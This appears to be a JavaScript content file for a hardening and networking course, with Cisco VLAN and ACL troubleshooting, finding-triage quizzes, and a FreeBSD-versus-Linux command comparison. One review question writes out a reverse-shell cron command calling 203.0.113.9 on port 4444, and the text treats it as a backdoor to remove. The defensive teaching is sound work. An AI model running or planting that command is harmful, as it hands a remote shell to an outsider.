     ['Gi0/1       10,20,99','VLAN 30 is missing from the allowed list, so Principals frames stop at SwA and Principals lose their gateway. Fix: switchport trunk allowed vlan add 30.'],
     ['SwA# show running-config interface g0/1 | include native|mode|portfast',null],
     [' switchport trunk native vlan 99',null],
     [' switchport mode trunk',null],
     [' spanning-tree portfast trunk','PortFast belongs on the Fa edge ports. G0/1 is the uplink trunk; if a switch ever sits at the far end, PortFast lets a loop forward before spanning tree can block it. Fix: no spanning-tree portfast trunk.'],
     ['RtrA# show running-config | section interface GigabitEthernet0/0',null],
     ['interface GigabitEthernet0/0.1',null],
     [' encapsulation dot1Q 1 native','RtrA treats VLAN 1 as native while SwA sends VLAN 99 untagged, so the two ends disagree about untagged frames. Fix: interface g0/0.99 with encapsulation dot1Q 99 native, and remove g0/0.1.'],
     ['interface GigabitEthernet0/0.20',null],
     [' encapsulation dot1Q 20',null],
     [' ip address 10.1.20.1 255.255.255.0',null],
     ['RtrA# show running-config | include access-list',null],
     ['access-list 20 permit 10.1.20.0 0.0.0.255',null],
     ['access-list 20 permit 10.2.20.0 0.0.0.255',null],
     ['access-list 20 permit 10.1.10.0 0.0.0.255','10.1.10.0/24 is the Students subnet. Management belongs to Teachers only, so this line opens SSH on RtrA to every Students PC. Fix: ip access-list standard 20, then no 30 (the line’s sequence number in show access-lists).']
   ]),
   MATCH('j4m','Symptom and the first command to run','Tap a symptom, then the command that checks its most likely cause first.',[
     ['One VLAN loses its gateway','show interfaces trunk','A VLAN missing from the allowed list stops at the switch, short of the router.'],
     ['The SVI is down/down','show vlan brief','Autostate holds the SVI down until its VLAN exists with an up port.'],
     ['SSH from a Teachers PC is refused','show access-lists','Check that ACL 20 permits the Teachers subnet and that its match counts rise.'],
     ['Site B is unreachable','show ip route','Look for a route to 10.2.0.0; a router drops packets for a network missing from its table.']
   ]),
   ORDER('j4o','Troubleshoot a failed inter-VLAN ping, bottom up','A Students PC fails to ping a Teachers PC. Tap the checks in the order that follows the packet from the PC to the router.',[
     ['Check the PC’s IP address, mask, and default gateway','ipconfig on the PC: a wrong gateway stops traffic before it leaves the host.'],
     ['Check the access port’s VLAN','show vlan brief: the PC’s port must sit in the VLAN that matches its subnet.'],
     ['Check the trunk’s allowed list and native VLAN','show interfaces trunk: the VLAN must be allowed and forwarding, with native 99 on both ends.'],
     ['Check that the router’s parent interface is up','show ip interface brief: g0/0 must be up/up, because every subinterface rides on it.'],
     ['Check each subinterface’s encapsulation and IP address','show running-config | section GigabitEthernet0/0: each dot1Q tag and gateway address must match its VLAN and subnet.'],
     ['Check the route table','show ip route: both subnets must appear as connected (C) routes.']
   ]),
   QUIZ('j4q','Check: switching and routing',[
     ['The wildcard mask for the subnet 255.255.255.0 in an ACL is',['255.255.255.0','0.0.0.255','255.255.255.255','0.0.0.0'],1,'Wildcard masks are the inverse of the subnet mask. 0 means "must match", 255 means "any".'],
     ['Hosts in VLAN 10 and VLAN 20 need to reach each other. What provides the path?',['A second switch','Inter-VLAN routing (router subinterfaces or a layer 3 switch)','A longer cable','Disabling the firewall'],1,'VLANs are separate networks; something at layer 3 must route between them.'],
     ['Your extended ACL has only "deny tcp any any eq 23". Hosts lose all connectivity. Why?',['Telnet is required','The implicit deny any at the end drops everything else','ACLs work only on switches','The switch is off'],1,'Add permit ip any any after the deny so other traffic passes.'],
     ['Which command shows which ports belong to which VLAN?',['show ip route','show vlan brief','show running-config | include ip','show mac address-table'],1,'show vlan brief maps VLANs to access ports. show interfaces trunk shows the trunks.']
   ]),
   QUIZ('j4q2','Interleaved review',[
     ['How does RtrA match SwA’s native VLAN 99?',['<code>interface g0/0.99</code>, then <code>encapsulation dot1Q 99 native</code>','<code>switchport trunk native vlan 99</code> on g0/0','An IP address on g0/0.99','<code>vlan 99</code> on the router'],0,'The native keyword makes the subinterface send and receive VLAN 99 untagged. It carries no hosts, so it takes no IP address.'],
     ['What separates <code>access-class 20 in</code> from <code>ip access-group 20 in</code>?',['They do the same job; <code>access-class</code> is the older spelling','<code>access-class</code> filters sessions to the device; <code>ip access-group</code> filters traffic through an interface','<code>access-class</code> takes standard ACLs; <code>ip access-group</code> takes extended ACLs only','<code>access-class</code> works on switches; <code>ip access-group</code> works on routers'],1,'Management access is a line setting, so ACL 20 goes on every VTY line with access-class. Interface ACLs filter traffic on its way through.'],
     ['Why does 99 join the trunk’s allowed list (10,20,30,99)?',['VLAN 99 carries the Principals','The native VLAN must be the highest number listed','Listing 99 makes its frames tagged','The allowed list filters the native VLAN too'],3,'A trunk drops frames for any VLAN missing from its allowed list, the native VLAN included. Listing 99 lets the untagged native VLAN cross to RtrA g0/0.99.'],
     ['From Sophomore: how do <code>vlan 20</code> and <code>interface vlan 20</code> differ?',['Both create the VLAN; the SVI form also lists its ports','The SVI creates the VLAN for you, so <code>vlan 20</code> is optional','The VLAN is a broadcast domain; the SVI is the switch’s address in it','The VLAN holds the IP address; the SVI holds the access ports'],2,'Create the VLAN first. The SVI reaches up/up only once VLAN 20 exists and an up port or trunk carries it.'],
     ['From Sophomore: a teacher types <code>telnet 10.1.20.2</code>. What happens?',['A login prompt appears, since Telnet is on by default','The connection is refused: <code>transport input ssh</code> admits SSH alone','The switch upgrades the session to SSH automatically','Telnet connects and logs a warning to the console'],1,'transport input ssh makes the VTY lines accept SSH only, so Telnet gets connection refused.'],
     ['From Freshman: which SwA ports get PortFast?',['G0/1, the trunk, so the router link comes up sooner','Every port, G0/1 and the parked ports included','The access ports Fa0/1 to Fa0/20','The parked ports, so they come up sooner when enabled'],2,'PortFast belongs on edge ports. The trunk keeps the full listening and learning stages, so spanning tree can catch a loop.']
   ]),
   QUIZ('j4q3','Check: hops, routes, and DHCP',[
     ['A Students PC at 10.1.10.20 pings 10.1.20.30 through RtrA. As the frame travels back down the trunk toward the Teachers PC, which addresses does it carry?',['Source MAC: the Students PC; source IP: 10.1.10.20','Source MAC: SwA; source IP: 10.1.10.1','Source MAC: RtrA; source IP: 10.1.10.20','Source MAC: RtrA; source IP: 10.1.20.1'],2,'The router builds a new frame with its own MAC as the source, while the IP addresses ride through from end to end.'],
     ['A router holds S 10.1.0.0/16, O 10.1.20.0/24 (learned through OSPF), and S* 0.0.0.0/0. Which route forwards a packet for 10.1.20.30?',['O 10.1.20.0/24, the longest matching prefix','S 10.1.0.0/16, because static routes have the lower AD','S* 0.0.0.0/0, the default route','All three, sharing the load'],0,'The longest prefix wins first. Administrative distance breaks ties only between routes to the same prefix.'],
     ['A branch site’s PCs reach the other site, yet the internet stays out of reach. The branch router’s show ip route lists C, L, and S lines and reads “Gateway of last resort is not set”. What is missing?',['An L route for g0/2','PortFast on the trunk','A second static route to the other site','A default route toward the ISP'],3,'A router drops traffic for networks missing from its table. ip route 0.0.0.0 0.0.0.0 with the ISP’s next hop sets the gateway of last resort.'],
     ['Students PCs get 169.254.x.x addresses, and the DHCP server sits in a server VLAN behind RtrA. What does g0/0.10 need?',['A second trunk','ip helper-address with the server’s address, so the router relays the broadcast','PortFast on g0/0.10','A /30 mask'],1,'Routers keep broadcasts inside each VLAN, and a relay on the gateway forwards the DHCP request to the server.'],
     ['ipconfig is correct, the access port sits in the right VLAN, and the trunk carries that VLAN, yet the ping dies at RtrA, whose show ip route lacks the destination network. Which layer is at fault?',['Layer 1: the cable','Layer 2: the VLAN','Layer 3: the route','Layer 7: the application'],2,'Layers 1 and 2 checked out on the way up; a missing route is a layer 3 fault.']
   ]),
   MATCH('j4m3','Attack and the switch defense','Tap a symptom, then the switch feature that stops its cause.',[
     ['Clients get a gateway address that belongs to no router','DHCP snooping, uplinks trusted','A rogue DHCP server answered first.'],
     ['A host’s port starts carrying several VLANs','Access mode plus switchport nonegotiate','DTP let the host negotiate a trunk.'],
     ['The gateway’s MAC address suddenly maps to a classroom PC','Dynamic ARP inspection','ARP poisoning sends traffic through the attacker.'],
     ['A switch on a classroom jack becomes the root bridge','BPDU guard on edge ports','Its BPDUs claimed root.'],
     ['A broadcast flood saturates every port','Storm control','A per-port limit drops the excess broadcasts.'],
     ['An unknown laptop appears on a Teachers port','Port security','It limits which MAC addresses may use the port.']
   ],'Analyze'),
   LINKS('Go further',['t4t-ios','t4t-tickets','t4t-audit','t4t-ld-ios','t4t-lr-ios','pt','netacad'])
  ]},
 {id:'j5',title:'Evaluate a configuration',bloom:'Evaluate',sum:'Read a config or a system like an auditor: rank findings by impact and defend the order.',
  blocks:[
   C('Thinking like an auditor','Evaluate',
     P('At this grade you move from asking "is this a finding?" to asking "which finding do I fix first?" Rank by <b>impact</b> (how much an attacker gains) and <b>effort</b> (how fast you fix it). A domain admin backdoor outranks a missing login banner even though both are findings.'),
     TIPS('High impact: extra administrators, UID-0 backdoors, reverse shells, root SSH login, blank or shared passwords, and disabled firewall and antivirus.',
          'Medium: missing updates, weak password policy, SMBv1 left on, insecure services beyond what the brief needs, and over-broad shares.',
          'Low but worth doing: banners, screen-lock timeouts, audit logging, and unauthorized media files.',
          'Always weigh availability risk: a "fix" that stops a required service is an outage, which is worse than leaving the finding for later.',
          'The same ranking works on network devices: <a href="#senior/se6">Cisco: audit and extend the two-site network</a> applies it to a full audit of SwB and RtrB.')),
    SCALE('Triage: impact first, effort second, availability always',{
     x:['Effort to fix','Quick','Slow'],
     y:['Impact','High','Medium','Low'],
     cells:[
       [['1. First','A second UID 0 account, a reverse-shell cron job, extra admins, a blank or guest password, root SSH login, or the firewall or antivirus turned off','l4'],['2. Second','Tracing how a backdoor got in: cron, systemd units, startup files, and new accounts','l4']],
       [['3. Third','A weak password policy, or an insecure service the brief leaves out','l3'],['4. Fourth','Missing updates and over-broad shares','l2']],
       [['5. Fifth','A login banner and a screen-lock timeout','l1'],['6. Last','Hunting unauthorized media files across the disk','muted']]]},
     {intro:'Read the rows from the top: impact decides first. Within a row, the quicker fix goes first because it removes risk sooner.',
      note:'<b>Availability can veto any cell.</b> Before each fix, ask whether it stops a required service or locks out an authorized user. If it does, harden and restrict instead: an outage is worse than a finding left for later.',
      caption:'Highest impact, lowest effort, and lowest availability risk first.',
      bloom:'Evaluate'}),
   ORDER('j5o','Rank the findings on one machine','Order these from fix-first to fix-last by impact, assuming each one falls outside the required services. The first four share the top tier, so any order among them counts.',[
     ['A second account with UID 0','An unauthorized root. Total compromise; fix immediately.',0],
     ['A reverse-shell cron job calling out to the internet','Active backdoor; remove now and find its source.',0],
     ['Guest account enabled with blank password','Trivial anonymous access; disable at once.',0],
     ['SSH permits root login with a password','Direct remote path to the crown jewels; close it.',0],
     ['Automatic updates off and 40 missing patches','Serious but slower to exploit than an open door; patch next.'],
     ['Missing login banner and 15-minute screen lock','Low impact, still worth fixing; mop up at the end.']
   ]),
   QUIZ('j5q','Check: judgment',[
     ['Two findings: (a) Telnet running, required by the brief for a legacy device; (b) a netcat listener on 1337 absent from the brief. Which do you remove?',['Both','Only (b); harden and restrict (a)','Only (a)','Neither'],1,'Required services get hardened and restricted, and they stay in place. The unlisted listener is malware.'],
     ['Your maintenance window closes in ten minutes. Which usually reduces the most risk per minute?',['Writing a login banner','Confirming only authorized admins remain and the firewall and antivirus are on','Renaming the Administrator account','Reading the whole config again'],1,'High-impact areas first. Cheap, high-value checks beat cosmetic ones under time pressure.'],
     ['A teammate wants to delete a user to "be safe," but the brief lists that user as authorized. Your call?',['Delete it','Keep it; deleting an authorized user breaks something the business needs','Disable it, then delete it','Rename it'],1,'Authorized means protected. Disabling it is also wrong here; leave it and secure it.'],
     ['Why rank findings at all instead of fixing them top to bottom?',['It looks professional','Time is limited and impact varies; ranking removes the most risk soonest','The firewall requires it','It is irrelevant'],1,'Triage is the skill. Highest impact, lowest effort, and lowest availability risk first.']
   ]),
   QUIZ('j5q2','Check: weigh the risk',[
     ['Two findings on a domain controller: an extra member of Domain Admins, and a missing login banner. You have five minutes. Which first, and why?',['The banner: it takes one minute','The extra Domain Admin: it is an administrator on every joined computer','Both at once','Whichever the brief lists first'],1,'Impact decides first. The extra admin is a domain-wide open door, and the banner is cosmetic.'],
     ['SSH allows root login with a password, and the server faces the internet. Name the vulnerability, a likely threat, and the risk.',['Vulnerability: the bots; threat: the setting; risk: low','Vulnerability: SSH itself; threat: the firewall; risk: minimal','Vulnerability: the internet; threat: root; risk: medium','Vulnerability: the root-login setting; threat: password-guessing bots; risk: likely and severe'],3,'A vulnerability is the weakness you control, a threat is who would use it, and risk is how likely and how bad. Both run high here, so it ranks first.'],
     ['The firewall already blocks port 1337, and a netcat listener still runs on it. Is removing the listener worth the time?',['Yes: the firewall is one layer, and a rule change, a local user, or a pivot can still reach the listener, so remove it and its starter','The firewall covers it, so leave it','Only when the brief mentions netcat','Only after every other finding'],0,'Defense in depth: each layer assumes the others can fail, and a blocked backdoor is still a backdoor.'],
     ['Automatic updates are off with 40 missing patches, and a second UID 0 account exists. Why does the UID 0 account still come first?',['Patches matter only on servers','The patches need a reboot first','It gives total control today, while the missing patches wait for an attacker to exploit a known CVE','UID 0 accounts slow the machine'],2,'Both are serious: known CVEs make missing patches a real risk, yet an extra root account is already a compromise.']
   ]),
   LINKS('Go further',['t4t-audit','stig','cis','nist-csf'])
  ]}
 ]
});

LEVELS.push({
 id:'senior', grade:'Senior', range:'Advanced to team lead', color:'var(--l4)', chev:4,
 blooms:['An','E','Cr'], bloomCap:'Analyze, evaluate, and create. You build systems: a checklist, a role plan, and a runbook.',
 intro:'FreeBSD, Windows credential and domain attacks, and web application security join the mix, and the differentiator shifts from knowledge to a team that works like a system: a checklist written from standards, clear roles, a time plan, and the discipline to understand every change before making it. This grade is where you create those artifacts, and own the ethics that come with the skill.',
 mentor:['Hand the pen to the learners. Your job here is to review what they create (checklist, role plan, and runbook) and leave the authorship to them.','Run full timed practice sessions on Lockdown Range or your own VMs, then debrief. The debrief, more than the run, is where the learning lands.','Train every fix by hand before anyone automates it. A script is a liability until someone on the team can explain it.','Make the ethics conversation explicit and recurring. These learners can now do real damage; the whole point is that they choose restraint.'],
 units:[
 {id:'se0',title:'Ready for Senior?',bloom:'Review',sum:'Twelve questions on what Freshman, Sophomore, and Junior taught. Advisory: every unit stays open, and each miss links to the unit that teaches it.',
  blocks:[
   C('How this check works','Understand',
     P('Answer all twelve, then read the reason under each one. Each reason ends with a link to the unit that teaches it, so a miss tells you exactly what to review. The check counts toward your progress like any quiz, and every unit stays open whatever your score.')),
   QUIZ('se0q','Ready for Senior?',[
     ['Which wildcard mask matches the subnet 10.1.20.64/26 in an ACL?',['0.0.0.64','0.0.0.255','0.0.0.63','255.255.255.192'],2,'Subtract each mask octet from 255: 255.255.255.192 becomes 0.0.0.63. <a href="#junior/j4">Review: Cisco: VLANs, routing, and ACLs</a>'],
     ['Which command sends every Site B subnet (10.2.x.0/24) from RtrA to RtrB at 10.0.0.2?',['access-list 10 permit 10.2.0.0 0.0.255.255','ip route 10.2.0.0 255.255.0.0 10.0.0.2','ip route 10.0.0.2 255.255.0.0 10.2.0.0','ip default-gateway 10.0.0.2'],1,'ip route takes the destination network, its mask, and the next hop, in that order. <a href="#junior/j4">Review: Cisco: VLANs, routing, and ACLs</a>'],
     ['Where does an extended ACL that blocks Students’ Telnet belong, and why?',['Close to the destination, so it filters only what you mean','On every interface in both directions','On the VTY lines, as an access-class','Close to the source, inbound on the Students subinterface, so unwanted traffic stops early'],3,'An extended ACL reads protocol, source, destination, and port, so it can sit close to the source; a standard ACL reads the source alone and sits close to the destination. <a href="#junior/j4">Review: Cisco: VLANs, routing, and ACLs</a>'],
     ['Two GPOs set the same option differently: one linked at the domain, one at the Staff OU that holds the user. Which wins?',['The Staff OU GPO: the closest OU applies last','The older GPO','The domain GPO','Local policy'],0,'In LSDOU order the child OU applies last; only an Enforced link or Block Inheritance changes that. <a href="#junior/j2">Review: Group Policy</a>'],
     ['eve sits in Domain Admins, and the brief lists eve as a standard user. How far does that admin power reach?',['Nowhere until eve signs in at the DC','Only the domain controller','Every computer joined to the domain, because Domain Admins sits in each machine’s local Administrators group','Only eve’s own PC'],2,'Domain Admins holds full control of the domain and of every joined machine, so an extra member is an administrator everywhere. <a href="#junior/j1">Review: Windows Server and Active Directory</a>'],
     ['alice joins the Finance group, and no GPO in the domain uses security filtering. Which GPOs apply to alice’s user account now?',['Every GPO linked to the Finance group','Only the Default Domain Controllers Policy','Only local policy until alice signs out','The same ones as before: policy follows the OU that holds the account, while a group grants rights and permissions'],3,'GPOs link to sites, domains, and OUs, and joining a group leaves the account in its OU. Security filtering is the one way a group narrows a linked GPO. <a href="#junior/j2">Review: Group Policy</a>'],
     ['You run sudo sysctl -w net.ipv4.conf.all.rp_filter=1. What happens after a reboot?',['The value stays, because sysctl -w writes a file','The value resets unless a file in /etc/sysctl.d sets it','The machine stops routing','The kernel refuses the change'],1,'sysctl -w changes the running kernel; a line in /etc/sysctl.d makes the value return at every boot. <a href="#junior/j3">Review: Debian and deeper Linux</a>'],
     ['You delete a cron line that runs bash -i &gt;&amp; /dev/tcp/203.0.113.9/4444 0&gt;&amp;1. What comes next?',['Hunt for how it got there: other cron locations, systemd units, and shell startup files','Block port 4444 and keep the line','Reboot and move on','Reinstall cron'],0,'Persistence rarely travels alone, and whatever planted the line can plant it again. <a href="#junior/j3">Review: Debian and deeper Linux</a>'],
     ['Which single command stops a service now and keeps it off at the next boot?',['sudo kill NAME','sudo systemctl disable NAME','sudo systemctl stop NAME','sudo systemctl disable --now NAME'],3,'disable --now flips both switches; stop alone lasts until a reboot, and disable alone waits for the next boot. <a href="#junior/j3">Review: Debian and deeper Linux</a>'],
     ['Three findings: a NOPASSWD sudoers line for an unlisted user, 12 missing patches, and a missing login banner. In what order do you fix them?',['Any order, since all three are findings','The sudoers backdoor, then the patches, then the banner','The patches, then the sudoers line, then the banner','The banner, then the patches, then the sudoers line'],1,'Impact decides first: an open root path outranks slower-to-exploit missing patches, and cosmetic items come last. <a href="#junior/j5">Review: Evaluate a configuration</a>'],
     ['Removing SMB would close a finding, but the brief says staff use the HR share. What is the best call?',['Keep SMB, then harden and restrict it','Leave it fully open, since the brief requires it','Remove SMB, since security comes first','Move the share to a USB drive'],0,'Availability can veto any fix: harden and restrict the required service instead of causing an outage. <a href="#junior/j5">Review: Evaluate a configuration</a>'],
     ['Which choice protects data while it crosses a network?',['base64 encoding','A SHA-256 hash','TLS encryption','A longer password'],2,'Encryption gives confidentiality to key holders alone; a hash checks integrity, and anyone can decode an encoding. <a href="#sophomore/s6">Review: Investigation questions and the change log</a>']
   ])
  ]},
 {id:'se1',title:'FreeBSD',bloom:'Analyze',sum:'A different Unix: where the files live, how services and the firewall work, and how to map your Linux habits across.',
  blocks:[
   C('Translate your Linux instincts','Analyze',
     TIPS('FreeBSD is a Unix in its own right, distinct from Linux. The base system and third-party <b>ports/packages</b> are separate. Package tool: <code>pkg</code>.',
          'Services are enabled in <b>/etc/rc.conf</b> (or with <code>sysrc</code>) and started or stopped with <code>service</code>. FreeBSD runs rc scripts in place of systemd.',
          'FreeBSD has three firewalls built into the base system: <b>pf</b>, <b>ipfw</b>, and <b>ipf</b> (IPFILTER). pf rules live in <code>/etc/pf.conf</code>.',
          'Users: <code>pw</code> manages accounts; membership in the <b>wheel</b> group is required to <code>su</code> to root; sudo, if installed from packages, is configured in <code>/usr/local/etc/sudoers</code>.',
          'Updating: <code>freebsd-update fetch install</code> for the base system, <code>pkg update &amp;&amp; pkg upgrade</code> for packages. On a system installed from base packages (pkgbase, FreeBSD 15 and later), <code>pkg upgrade -r FreeBSD-base</code> patches the base instead.',
          '<b>Physical access.</b> Booting to single-user mode gives a root shell at the console unless <code>/etc/ttys</code> marks the console <code>insecure</code>, which makes single-user mode ask for root’s password. The trade-off: recovering a lost root password then needs boot media.'),
    STACK('Base system and packages: two layers, two update paths',[
       {name:'Debian, Ubuntu, and Mint',layers:[['One package collection','Kernel, core tools, and applications alike<br>Patch it all: <code>apt upgrade</code><br>Config: <code>/etc</code>',2,'muted']]},
       {name:'FreeBSD',layers:[
         ['Packages and ports','Third-party software, such as sudo, bash, and nginx<br>Patch: <code>pkg upgrade</code><br>Files: <code>/usr/local</code><br>Config: <code>/usr/local/etc</code>',1,'l2'],
         ['Base system','Kernel and core userland, such as sh, sshd, and pf<br>Patch: <code>freebsd-update</code><br>Config: <code>/etc</code>',1,'l4']]}
     ],{intro:'On Linux one package manager patches everything. FreeBSD keeps two layers, and each layer has its own update tool and its own place for configuration.',
       note:'<b>Ports or packages?</b> The same third-party collection in two forms: ports build from source, and packages arrive prebuilt through <code>pkg</code>. Both install under <code>/usr/local</code>. On FreeBSD 15 and later, a system installed from base packages (pkgbase) patches its base with <code>pkg upgrade -r FreeBSD-base</code> as well.',
       caption:'Patch both layers, each with its own tool, and look for third-party configuration, such as sudoers, under /usr/local/etc.',
       key:[['l4','Base system, maintained by the FreeBSD project'],['l2','Third-party packages and ports'],['muted','One collection for everything (Debian family)']],
       alt:['Debian, Ubuntu, and Mint: one package collection holds the kernel, the core tools, and the applications. apt update then apt upgrade patches all of it, and configuration lives in /etc.',
            'FreeBSD, top layer: packages and ports, the third-party software such as sudo, bash, and nginx. pkg update then pkg upgrade patches it; its files live under /usr/local and its configuration under /usr/local/etc.',
            'FreeBSD, bottom layer: the base system, meaning the kernel and core userland such as sh, sshd, and pf. freebsd-update fetch install patches it (pkg upgrade -r FreeBSD-base on a pkgbase install), and its configuration lives in /etc.']}),
     CMDS('FreeBSD essentials',[
       ['cat /etc/passwd','Same format idea as Linux. Hunt for UID 0 accounts: besides root, some FreeBSD releases ship toor, a spare superuser whose login is disabled (* in master.passwd). Anything else at UID 0 is a finding.'],
       ['pw groupshow wheel','Who can su to root. Compare to the scenario brief.'],
       ['pw groupmod wheel -d dave','Remove dave from wheel.'],
       ['pw lock bob','Lock an account (pw unlock bob reverses it).'],
       ['sysrc -a','Show rc.conf settings (what is enabled at boot).'],
       ['service -e','List enabled services.'],
       ['service sshd restart','Start, stop, or restart a service by name.'],
       ['sockstat -4 -l','Listening IPv4 sockets with the owning process (FreeBSD’s answer to ss).'],
       ['pkg info','Installed packages. pkg which /path traces a file to its package.'],
       ['freebsd-update fetch install','Patch the base system. On a pkgbase install: pkg upgrade -r FreeBSD-base.'],
       ['vi /etc/pf.conf','Firewall rules. Then: pfctl -f /etc/pf.conf to load, pfctl -e to enable.']
     ])),
    COMPARE('Linux habit, FreeBSD equivalent',[
     {name:'Linux',tag:'Debian, Ubuntu, and Mint',tone:'muted',
      svg:{label:'On Linux, systemctl asks systemd to enable or start a service, and systemd reads that service’s unit file.',view:'0 0 250 74',
       body:'<g fill="var(--paper)" stroke="var(--ink-3)" stroke-width="1.5"><rect x="1" y="14" width="72" height="28" rx="5"/><rect x="89" y="14" width="72" height="28" rx="5"/><rect x="177" y="14" width="72" height="28" rx="5"/></g><g font-size="11" text-anchor="middle" fill="var(--ink)"><text x="37" y="32">systemctl</text><text x="125" y="32">systemd</text><text x="213" y="32">unit files</text></g><g fill="none" stroke="var(--ink-3)" stroke-width="1.5"><path d="M74 28 H86" marker-end="url(#arrow)"/><path d="M162 28 H174" marker-end="url(#arrow)"/></g><text x="125" y="62" font-size="10" text-anchor="middle" fill="var(--ink-2)">one manager starts and watches every service</text>'},
      rows:[['Enable at boot','<code>systemctl enable ssh</code>'],['Start now','<code>systemctl start ssh</code>'],['Install software','<code>apt install</code>'],['Patch','<code>apt upgrade</code>, kernel included'],['Listening ports','<code>ss -tulnp</code>'],['Accounts','<code>useradd</code>, <code>usermod</code>, and <code>passwd</code>'],['Admin power','The sudo group'],['Firewall','ufw, nftables, or iptables'],
            ['Password hashes','<code>/etc/shadow</code>'],['Password policy','<code>/etc/login.defs</code> and pam_pwquality'],['Lockout','pam_faillock locks the account'],['Logs','<code>journalctl</code>, or <code>/var/log/auth.log</code>'],['Scheduled jobs','cron, at, and systemd timers'],['Startup persistence','systemd units, <code>/etc/rc.local</code>, and shell files such as <code>.bashrc</code> and <code>.profile</code>'],['Root-equivalent groups','docker, lxd, and disk']],
      hook:'one manager, systemd, runs every service.'},
     {name:'FreeBSD',tag:'Base system plus pkg',tone:'l4',
      svg:{label:'On FreeBSD, sysrc writes a YES switch into /etc/rc.conf, and at boot rc runs the rc.d script of every service set to YES.',view:'0 0 250 74',
       body:'<g fill="var(--paper)" stroke="var(--l4)" stroke-width="1.5"><rect x="1" y="14" width="72" height="28" rx="5"/><rect x="89" y="14" width="72" height="28" rx="5"/><rect x="177" y="14" width="72" height="28" rx="5"/></g><g font-size="11" text-anchor="middle" fill="var(--ink)"><text x="37" y="32">sysrc</text><text x="125" y="32">/etc/rc.conf</text><text x="213" y="32">rc.d scripts</text></g><g fill="none" stroke="var(--l4)" stroke-width="1.5"><path d="M74 28 H86" marker-end="url(#arrow-l4)"/><path d="M162 28 H174" marker-end="url(#arrow-l4)"/></g><text x="125" y="62" font-size="10" text-anchor="middle" fill="var(--ink-2)">at boot, rc runs each service set to YES</text>'},
      rows:[['Enable at boot','<code>sysrc sshd_enable=YES</code>'],['Start now','<code>service sshd start</code>'],['Install software','<code>pkg install</code>'],['Patch','<code>freebsd-update fetch install</code> for the base, <code>pkg upgrade</code> for packages'],['Listening ports','<code>sockstat -4 -l</code>'],['Accounts','<code>pw useradd</code>, <code>pw usermod</code>, and <code>passwd</code>'],['Admin power','The wheel group (for su to root)'],['Firewall','pf (<code>/etc/pf.conf</code>), ipfw, or ipf: one per host'],
            ['Password hashes','<code>/etc/master.passwd</code> (600 root:wheel), edited with <code>vipw</code>, which rebuilds the databases (pwd_mkdb)'],['Password policy','A login class in <code>/etc/login.conf</code> (rebuild with <code>cap_mkdb</code>) and pam_passwdqc'],['Lockout','blocklistd blocks the address in pf (named blacklistd before FreeBSD 15)'],['Logs','<code>/var/log/auth.log</code>, <code>messages</code>, and <code>security</code>; OpenBSM audit trails, read with <code>praudit</code>'],['Scheduled jobs','cron (<code>/var/cron/tabs</code>), at, and periodic (<code>/etc/periodic</code> and <code>/usr/local/etc/periodic</code>)'],['Startup persistence','rc.d scripts in <code>/etc/rc.d</code> and <code>/usr/local/etc/rc.d</code>, <code>/etc/rc.local</code>, and both shell families: <code>.shrc</code>, <code>.profile</code>, and <code>.cshrc</code>'],['Root-equivalent groups','operator, which can read the raw disks and so the password hashes']],
      hook:'a list of YES switches in /etc/rc.conf, read at every boot.'}
   ],{intro:'Each row label is a job you already do on Linux. Find the same label in the FreeBSD column for the tool that does that job there.',
     note:'Typing a Linux command on FreeBSD usually returns “command not found”. That message is your cue to translate the habit, then read the FreeBSD man page.',
     caption:'The jobs match and the tools differ: FreeBSD manages services with rc.conf and the service command, packages with pkg, and accounts with pw.',
     alt:['Enable a service at boot: systemctl enable ssh on Linux; sysrc sshd_enable=YES on FreeBSD, which writes the setting into /etc/rc.conf.',
          'Start a service now: systemctl start ssh on Linux; service sshd start on FreeBSD.',
          'Install software: apt install on Linux; pkg install on FreeBSD.',
          'Patch: apt upgrade on Linux, kernel included; on FreeBSD, freebsd-update fetch install for the base system and pkg upgrade for packages.',
          'List listening ports with their processes: ss -tulnp on Linux; sockstat -4 -l on FreeBSD.',
          'Manage accounts: useradd, usermod, and passwd on Linux; pw useradd, pw usermod, and passwd on FreeBSD.',
          'Admin power: the sudo group on Debian, Ubuntu, and Mint; the wheel group, which may su to root, on FreeBSD.',
          'Firewall: ufw, nftables, or iptables on Linux; pf (rules in /etc/pf.conf), ipfw, or ipf on FreeBSD, one per host.',
          'Password hashes: /etc/shadow on Linux; /etc/master.passwd (mode 600, root:wheel) on FreeBSD, edited with vipw, which rebuilds the password databases with pwd_mkdb.',
          'Password policy: /etc/login.defs and pam_pwquality on Linux; a login class in /etc/login.conf, rebuilt with cap_mkdb, and pam_passwdqc on FreeBSD.',
          'Lockout: pam_faillock locks the account on Linux; on FreeBSD, blocklistd blocks the attacking address in pf (named blacklistd before FreeBSD 15).',
          'Logs: journalctl or /var/log/auth.log on Linux; /var/log/auth.log, messages, and security on FreeBSD, plus OpenBSM audit trails, read with praudit.',
          'Scheduled jobs: cron, at, and systemd timers on Linux; cron (/var/cron/tabs), at, and periodic (/etc/periodic and /usr/local/etc/periodic) on FreeBSD.',
          'Startup persistence: systemd units, /etc/rc.local, and shell files such as .bashrc and .profile on Linux; rc.d scripts in /etc/rc.d and /usr/local/etc/rc.d, /etc/rc.local, and both shell families (.shrc, .profile, and .cshrc) on FreeBSD.',
          'Root-equivalent groups: docker, lxd, and disk on Linux; operator on FreeBSD, which can read the raw disks and so the password hashes.',
          'The service model: on Linux, systemctl asks systemd, which reads unit files and watches every service. On FreeBSD, sysrc writes YES switches into /etc/rc.conf, and at boot rc runs the rc.d script of every service set to YES.']}),
   COMPARE('su, sudo, and doas on FreeBSD: three doors to root',[
     {name:'su',tag:'Base system',tone:'l4',
      svg:{label:'su: you type root’s password and get a root shell that runs every command.',
       body:'<rect x="2" y="22" width="38" height="28" rx="6" fill="var(--paper)" stroke="var(--ink-3)" stroke-width="1.5"/><text x="21" y="40" text-anchor="middle" font-size="11" fill="var(--ink)">you</text><path d="M42 36 H118" fill="none" stroke="var(--l4)" stroke-width="2" marker-end="url(#arrow-l4)"/><text x="80" y="28" text-anchor="middle" font-size="9" fill="var(--ink-2)">root’s password</text><rect x="122" y="10" width="74" height="54" rx="6" fill="var(--paper)" stroke="var(--l4)" stroke-width="2"/><text x="159" y="34" text-anchor="middle" font-size="11" fill="var(--ink)">root shell</text><text x="159" y="50" text-anchor="middle" font-size="9" fill="var(--ink-2)">every command</text>'},
      rows:[['Asks for','The <b>target</b> account’s password: root’s'],['Who may use it','Members of the <b>wheel</b> group'],['Gives','A whole root shell, until you type <code>exit</code>'],['Take it away','<code>pw groupmod wheel -d dave</code>']],
      hook:'borrowing the master key.'},
     {name:'sudo',tag:'Package, if installed',tone:'l2',
